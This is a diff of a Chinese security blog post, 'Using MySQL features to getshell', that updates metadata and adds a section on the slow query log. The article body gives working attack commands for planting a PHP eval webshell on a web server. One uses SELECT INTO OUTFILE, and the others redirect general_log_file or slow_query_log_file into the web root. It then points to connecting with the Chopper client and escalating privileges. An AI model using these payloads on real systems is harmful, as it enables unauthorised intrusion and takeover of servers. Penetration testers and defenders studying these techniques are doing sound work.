@@ -93,7 +93,7 @@
 <meta property="og:site_name" content="MaiKeFee|">
 <meta property="og:description" content="前言:此方法可以绕过–secure-file-priv 进行getshell. 查看 –secure-file-priv是否开启: show global variables like &amp;apos;%secure%&amp;apos;;securefile priv值为null,不能进行导出导入数据,不能读取(即使是root权限) 直接getshellselect &amp;apos;&amp;lt;?php @eval">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-09-21T08:52:47.238Z">
+<meta property="og:updated_time" content="2019-09-22T12:55:42.603Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="利用Mysql特性_getshell">
 <meta name="twitter:description" content="前言:此方法可以绕过–secure-file-priv 进行getshell. 查看 –secure-file-priv是否开启: show global variables like &amp;apos;%secure%&amp;apos;;securefile priv值为null,不能进行导出导入数据,不能读取(即使是root权限) 直接getshellselect &amp;apos;&amp;lt;?php @eval">
@@ -357,8 +357,8 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2019-09-21T16:52:47+08:00">
-                2019-09-21
+              <time title="更新于" itemprop="dateModified" datetime="2019-09-22T20:55:42+08:00">
+                2019-09-22
               </time>
             
           </span>
@@ -473,7 +473,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  199
+                  305
                 </span>
               
 
@@ -515,6 +515,17 @@
 <pre><code>show global variables like &apos;%secure%&apos;;</code></pre><p>securefile priv值为null,不能进行导出导入数据,不能读取(即使是root权限)</p>
 <h1 id="直接getshell"><a href="#直接getshell" class="headerlink" title="直接getshell"></a>直接getshell</h1><pre><code>select &apos;&lt;?php @eval($_POST[&apos;maikefee&apos;]); ?&gt;&apos; INTO OUTFILE &apos;网站目录/shell.php&apos;;</code></pre><h1 id="利用日志getshell"><a href="#利用日志getshell" class="headerlink" title="利用日志getshell:"></a>利用日志getshell:</h1><h2 id="查看genera文件配置情况"><a href="#查看genera文件配置情况" class="headerlink" title="查看genera文件配置情况"></a>查看genera文件配置情况</h2><pre><code>show global variables like &quot;%genera%&quot;;</code></pre><h2 id="开启日志记录"><a href="#开启日志记录" class="headerlink" title="开启日志记录"></a>开启日志记录</h2><pre><code>set global general_log=&apos;on&apos;;</code></pre><h2 id="日志文件导出指定目录"><a href="#日志文件导出指定目录" class="headerlink" title="日志文件导出指定目录"></a>日志文件导出指定目录</h2><pre><code>set global general_log_file=&apos;C:/phpstudy/WWW/shell.php&apos;;</code></pre><h2 id="记录sql语句写马，在查询中执行-没有安全狗，可直接传原马"><a href="#记录sql语句写马，在查询中执行-没有安全狗，可直接传原马" class="headerlink" title="记录sql语句写马，在查询中执行 (没有安全狗，可直接传原马)"></a>记录sql语句写马，在查询中执行 (没有安全狗，可直接传原马)</h2><pre><code>select &apos;&lt;?php @eval($_POST[&quot;wintrysec&quot;]); ?&gt;&apos;;</code></pre><h2 id="关闭记录"><a href="#关闭记录" class="headerlink" title="关闭记录"></a>关闭记录</h2><pre><code>set global general_log=off;
 菜刀连接后如果是普通权限，接下来开始提权</code></pre><p>提权:<br>    <a href="https://maikefee/archives/9ccf323f.html" target="_blank" rel="noopener">https://maikefee/archives/9ccf323f.html</a></p>
+<h1 id="第二种-慢查询日志来写shell"><a href="#第二种-慢查询日志来写shell" class="headerlink" title="第二种 慢查询日志来写shell"></a>第二种 慢查询日志来写shell</h1><p>我们主要利用慢查询日志来写shell,步骤大致分为三步:</p>
+<ol>
+<li><p>设置slow_query_log=1.即启用慢查询日志(默认禁用)。</p>
+<pre><code>set global slow_query_log=1;</code></pre></li>
+<li><p>伪造(修改)slow_query_log_file日志文件的绝对路径以及文件名</p>
+<pre><code>set global slow_query_log_file=&apos;dir\filename&apos;</code></pre></li>
+<li><p>向日志文件写入shell</p>
+<pre><code>select &apos;&lt;?php @eval($_POST[&quot;wintrysec&quot;]); ?&gt;&apos;;</code></pre></li>
+<li><p>关闭慢查询:</p>
+<pre><code>set global slow_query_log=0;</code></pre></li>
+</ol>
 
       
     </div>
@@ -544,7 +555,7 @@
   <p><span>本文标题:</span>利用Mysql特性_getshell</p>
   <p><span>文章作者:</span>MaiKeFee</p>
   <p><span>发布时间:</span>2019年09月14日</p>
-  <p><span>最后更新:</span>2019年09月21日</p>
+  <p><span>最后更新:</span>2019年09月22日</p>
   <p><span>原始链接:</span><a href="/archives/9ddcdbfc.html" title="利用Mysql特性_getshell">http://MaiKeFee.com/archives/9ddcdbfc.html</a>
     <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://MaiKeFee.com/archives/9ddcdbfc.html" aria-label="复制成功！"></i></span>
   </p>
@@ -680,7 +691,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">88</span>
+                  <span class="site-state-item-count">89</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -691,7 +702,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">49</span>
+                  <span class="site-state-item-count">50</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -702,7 +713,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">24</span>
+                  <span class="site-state-item-count">25</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -752,6 +763,10 @@
         
         
           <li>
+            <a href="/archives/62a9e9fc.html" title="Phpstudy(2016、2018版) 后门RCE的exp复现" target="_blank">Phpstudy(2016、2018版) 后门RCE的exp复现</a>
+          </li>
+        
+          <li>
             <a href="/archives/6b1007b5.html" title="他眼中的红队以及我眼中的" target="_blank">他眼中的红队以及我眼中的</a>
           </li>
         
@@ -765,10 +780,6 @@
         
           <li>
             <a href="/archives/d45f203f.html" title="Linux/Win端口转发工具" target="_blank">Linux/Win端口转发工具</a>
-          </li>
-        
-          <li>
-            <a href="/archives/58819fc3.html" title="Linux_x86_Pwn溢出漏洞" target="_blank">Linux_x86_Pwn溢出漏洞</a>
           </li>
         
       </ul>
@@ -790,7 +801,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言:</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#直接getshell"><span class="nav-number">2.</span> <span class="nav-text">直接getshell</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#利用日志getshell"><span class="nav-number">3.</span> <span class="nav-text">利用日志getshell:</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#查看genera文件配置情况"><span class="nav-number">3.1.</span> <span class="nav-text">查看genera文件配置情况</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#开启日志记录"><span class="nav-number">3.2.</span> <span class="nav-text">开启日志记录</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#日志文件导出指定目录"><span class="nav-number">3.3.</span> <span class="nav-text">日志文件导出指定目录</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#记录sql语句写马，在查询中执行-没有安全狗，可直接传原马"><span class="nav-number">3.4.</span> <span class="nav-text">记录sql语句写马，在查询中执行 (没有安全狗，可直接传原马)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#关闭记录"><span class="nav-number">3.5.</span> <span class="nav-text">关闭记录</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言:</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#直接getshell"><span class="nav-number">2.</span> <span class="nav-text">直接getshell</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#利用日志getshell"><span class="nav-number">3.</span> <span class="nav-text">利用日志getshell:</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#查看genera文件配置情况"><span class="nav-number">3.1.</span> <span class="nav-text">查看genera文件配置情况</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#开启日志记录"><span class="nav-number">3.2.</span> <span class="nav-text">开启日志记录</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#日志文件导出指定目录"><span class="nav-number">3.3.</span> <span class="nav-text">日志文件导出指定目录</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#记录sql语句写马，在查询中执行-没有安全狗，可直接传原马"><span class="nav-number">3.4.</span> <span class="nav-text">记录sql语句写马，在查询中执行 (没有安全狗，可直接传原马)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#关闭记录"><span class="nav-number">3.5.</span> <span class="nav-text">关闭记录</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#第二种-慢查询日志来写shell"><span class="nav-number">4.</span> <span class="nav-text">第二种 慢查询日志来写shell</span></a></li></ol></div>
             
 
           </div>
